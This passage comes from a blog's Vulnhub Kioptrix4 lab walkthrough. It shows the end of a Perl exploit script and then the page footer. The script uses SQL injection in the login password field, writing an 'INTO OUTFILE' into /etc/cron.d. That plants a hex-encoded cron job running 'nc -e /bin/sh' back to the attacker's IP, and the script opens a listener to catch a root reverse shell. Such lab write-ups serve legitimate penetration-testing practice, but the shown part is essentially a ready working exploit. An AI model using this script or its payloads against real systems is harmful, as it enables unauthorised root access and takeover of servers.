class="line">&#123;</span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Thanks to g0tmi1k for this local privilege escalation trick.</span></span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;* * * * * root /bin/nc.traditional <span class="variable">$ip</span> <span class="variable">$port</span> -e /bin/sh &quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;g0tr00t&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/etc/cron.d/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; AND 1=1 union select <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sleep</span>(60);</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Check the xterm window for the root shell... \n&quot;</span>;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub quit</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red"><em><strong>The end,to be continue…</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2019/12/10/Kioptrix4/" title="vulnhub靶机渗透[Kioptrix4]">https://fdlucifer.github.io/2019/12/10/Kioptrix4/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2019/12/08/vulnhub-Drunk-Admin-Web-Hacking-Challenge-1/" rel="prev" title="vulnhub靶机渗透[Drunk-Admin-Web-Hacking-Challenge-1]">
                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Drunk-Admin-Web-Hacking-Challenge-1]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2019/12/11/Hackademic-RTB1/" rel="next" title="vulnhub靶机渗透[Hackademic-RTB1]">
                  vulnhub靶机渗透[Hackademic-RTB1] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">618k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">37:29</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
